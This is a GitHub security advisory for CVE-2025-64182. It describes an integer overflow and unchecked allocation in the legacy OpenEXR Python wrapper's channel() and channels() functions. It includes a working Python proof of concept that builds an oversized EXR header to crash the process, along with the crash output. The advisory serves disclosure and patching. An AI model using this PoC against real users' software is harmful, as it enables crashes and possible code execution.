# [M] OpenEXR has buffer overflow in PyOpenEXR_old's channels() and channel()

## Summary
Severity: Medium
Advisory: GHSA-vh63-9mqx-wmjr
CVE: CVE-2025-64182
CWE: CWE-120
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-06
Source: https://github.com/advisories/GHSA-vh63-9mqx-wmjr
Type: github-advisory

## Affected
- PyPI: `OpenEXR` — affected >=3.2.0 <3.2.5
- PyPI: `OpenEXR` — affected >=3.3.0 <3.3.6
- PyPI: `OpenEXR` — affected >=3.4.0 <3.4.3

## Details
### Summary

A memory safety bug in the legacy OpenEXR Python adapter (the deprecated OpenEXR.InputFile wrapper) allow crashes and likely code execution when opening attacker-controlled EXR files or when passing crafted Python objects.

Integer overflow and unchecked allocation in InputFile.channel() and InputFile.channels() can lead to heap overflow (32 bit) or a NULL deref (64 bit).

This bug was found with [ZeroPath](https://zeropath.com/?utm_source=joshua.hu).

### Details

Integer overflow and unchecked allocation in InputFile.channel() and InputFile.channels() can lead to heap overflow (32 bit) or a NULL deref (64 bit), around [here](https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536).

-   In `channel()`:

    -   Width and height are derived from the header dataWindow using `int`.

    -   `typeSize` is a `size_t`. The buffer size is computed as `typeSize * width * height` with no bounds checks.

    -   The result is passed to `PyString_FromStringAndSize(NULL, size)` which maps to `PyBytes_FromStringAndSize`. That function expects `Py_ssize_t`. If the product overflows or exceeds `PY_SSIZE_T_MAX`, allocation fails or the value wraps.

    -   The return value is not checked. The code immediately calls `PyString_AsString(r)` and proceeds to build a `FrameBuffer` and calls `readPixels(miny, maxy)`.

    -   On 64 bit: `PyBytes_FromStringAndSize` returns NULL, the wrapper dereferences NULL and crashes.\
        On 32 bit: the multiplication can wrap to a small positive size, producing a too-small allocation, after which `readPixels` writes `typeSize * width` bytes per scanline for `height` lines into that buffer, causing a heap overflow.

-   In `channels()` the same pattern appears for each requested channel. It also ignores per-channel subsampling when computing the allocation and when inserting the `Slice` it hardcodes `xSampling=1, ySampling=1`. If a file actually has subsampled channels this makes the stride and allocation inconsistent, which can also lead to over or under writes.

### PoC

```python
# write_big_header_then_crash.py
import OpenEXR, Imath

# OpenEXR sanity clamp for header coords is about INT_MAX/2 - 1
INT_MAX = (1 << 31) - 1
MAX_COORD = (INT_MAX // 2) - 1  # 1073741822

# Choose a scanline width that keeps row-bytes < 2^31
# 400,000,000 * 4 bytes = ~1.6 GB per scanline, which many codecs accept
WIDTH = min(400_000_000, MAX_COORD + 1)   # pixels
HEIGHT = 64                                # small height keeps the file tiny

# Build windows from pixel counts
dw = Imath.Box2i(Imath.V2i(0, 0), Imath.V2i(WIDTH - 1, HEIGHT - 1))

# Robustly set NO_COMPRESSION across enum naming differences
def no_compression():
    # Try common names, else fallback to numeric 0
    C = Imath.Compression
    for name in ("NO_COMPRESSION", "NONE", "NO_COMPRESSION_ENUM"):
        if hasattr(C, name):
            return Imath.Compression(getattr(C, name))
    return Imath.Compression(0)

hdr = {
    "dataWindow": dw,
    "displayWindow": dw,
    "channels": {"R": Imath.Channel(Imath.PixelType(Imath.PixelType.FLOAT))},
    "compression": no_compression(),
    "lineOrder": Imath.LineOrder(Imath.LineOrder.INCREASING_Y),
}

# Write just the header (no pixels)
out = OpenEXR.OutputFile("big_header.exr", hdr)
out.close()

# Now trigger the legacy bug: huge allocation request returns NULL, code fails to check
f = OpenEXR.InputFile("big_header.exr")
print("Triggering crash...")
f.channels(["R"])
```

```
$ python3 poc.py 
Triggering crash...
libc++abi: terminating due to uncaught exception of type Iex_3_4::InputExc: Unable to query scanline information
Abort trap: 6              python3 poc.py
```

### Impact
Typical memory stuff.

## References
- https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vh63-9mqx-wmjr
- https://nvd.nist.gov/vuln/detail/CVE-2025-64182
- https://github.com/AcademySoftwareFoundation/openexr
- https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536
